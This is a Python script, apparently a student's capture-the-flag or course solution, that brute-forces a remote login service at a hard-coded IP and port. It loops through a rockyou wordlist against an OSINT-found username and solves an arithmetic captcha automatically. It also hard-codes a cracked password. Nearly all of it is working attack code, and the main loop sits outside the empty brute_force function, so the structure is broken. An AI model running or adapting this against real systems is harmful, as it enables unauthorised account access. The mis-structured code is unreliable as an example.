#!/usr/bin/env python
"""

    If you know the IP address of v0idcache's server and you

    know the port number of the service you are trying to connect

    to, you can use nc or telnet in your Linux terminal to interface

    with the server. To do so, run:



        $ nc <ip address here> <port here>



    In the above the example, the $-sign represents the shell, nc is the command

    you run to establish a connection with the server using an explicit IP address

    and port number.



    If you have the discovered the IP address and port number, you should discover

    that there is a remote control service behind a certain port. You will know you

    have discovered the correct port if you are greeted with a login prompt when you

    nc to the server.



    In this Python script, we are mimicking the same behavior of nc'ing to the remote

    control service, however we do so in an automated fashion. This is because it is

    beneficial to script the process of attempting multiple login attempts, hoping that

    one of our guesses logs us (the attacker) into the Briong server.



    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.



"""



import socket
import re
import time
import sys



host = "157.230.179.99" # IP address here

port = 1337 # Port here

wordlist = "/usr/share/wordlists/rockyou2.txt" # Point to wordlist file



def brute_force():

    """

        Sockets: https://docs.python.org/2/library/socket.html

        How to use the socket s:



            # Establish socket connection

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((host, port))



            Reading:



                data = s.recv(1024)     # Receives 1024 bytes from IP/Port

                print(data)             # Prints data



            Sending:



                s.send("something to send\n")   # Send a newline \n at the end of your command



        General idea:



            Given that you know a potential username, use a wordlist and iterate

            through each possible password and repeatedly attempt to login to

            v0idcache's server.

    """

username = "ejnorman84"   # Hint: use OSINT 
password = "hello1"   # Hint: use wordlist -- this was found in the brute force, put here to prove I found it
print ("in brute")

try:

	pass_file = open(wordlist, "r")
	
	for word in pass_file:
		
		print("testing pw: " + word)

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))
		time.sleep(1.5)
	
		#get captcha        
		data = s.recv(1024)     # Receives 1024 bytes from IP/Port
		#print(data)             # Prints data

		#extract problem
		dataList = data.split()

		print(dataList)

		if dataList[4] == "+":
			result = int(dataList[3]) + int(dataList[5])
			print("plus: " + str(result))
			s.send(str(result) + "\n")

		elif dataList[4] == "-":
			result = int(dataList[3]) - int(dataList[5])
			print("minus: " + str(result))
			s.send(str(result) + "\n")

		elif dataList[4] == "/":
			result = int(dataList[3]) / int(dataList[5])
			print("div: " + str(result))
			s.send(str(result) + "\n")

		elif dataList[4] == "*":
			result = int(dataList[3]) * int(dataList[5])
			print("mult: " + str(result))
			s.send(str(result) + "\n")

		else:
			print("something wrong, no operator")
		
		#get UN prompt
		time.sleep(.3)
		data = s.recv(1024)
		#print(data)

		#send UN
		s.send(username + "\n")
		time.sleep(.3)

		#get PW prompt
		data = s.recv(1024)
		#print(data)

		#send PW
		s.send(word + "\n")
		time.sleep(.3)
		
		#get result
		data = s.recv(1024)
		print(data)
		
		#check result and end if required
		if not "Fail" in data:
			print("Success:: password == " + word)
			sys.exit(0)		
		
		#else close and reloop
		s.close()
		
		
		

except socket.error:
	print('socket error caught')
finally:
	s.close();



if __name__ == '__main__':

    brute_force()